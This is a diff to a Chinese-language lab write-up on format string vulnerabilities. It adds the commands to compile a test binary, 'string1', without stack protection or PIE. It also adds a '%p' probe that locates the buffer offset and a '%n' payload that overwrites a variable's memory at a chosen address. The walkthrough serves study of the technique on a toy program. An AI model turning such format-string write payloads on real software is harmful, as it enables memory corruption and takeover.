@@ -175,16 +175,35 @@ Cool you changed it .. :)``
 ​	利用格式化字符串漏洞，我们可以exploit程序，实现修改任意地址内存中的值。
 
 
-## Lab WP
+## Lab - string1 WP
 
-编译，关闭PIE
+编译string1，关闭PIE
 
 ```
+gcc -m32 -g -fno-stack-protector -no-pie -fno-pie string1.c -o string1
 ```
+
+然后，通过格式化字符串payload定位buff对应在第几个参数位置：
+
+```
+echo -e `python2 -c 'print "AAAA %p %p %p %p %p %p %p %p"'` | ./string1
+```
+
+<img width="751" height="48" alt="image" src="https://github.com/user-attachments/assets/5d52769a-7826-474c-beab-bb777b34efc2" />
+
+在第7个参数的位置。
+
 
 通过调试拿到myvar变量在内存中的地址：
 
 <img width="739" height="661" alt="image" src="https://github.com/user-attachments/assets/d4d73178-5569-4f2d-99c7-5aeef7f16148" />
 
+
+```
+echo -e `python2 -c 'print b"\x18\xc0\x04\x08" + " %p %p %p %p %p %p %n"'`  | ./string1
+```
+
+
+<img width="780" height="45" alt="image" src="https://github.com/user-attachments/assets/2af309c0-8694-4d73-ac00-e6a8735d36fb" />
 
 
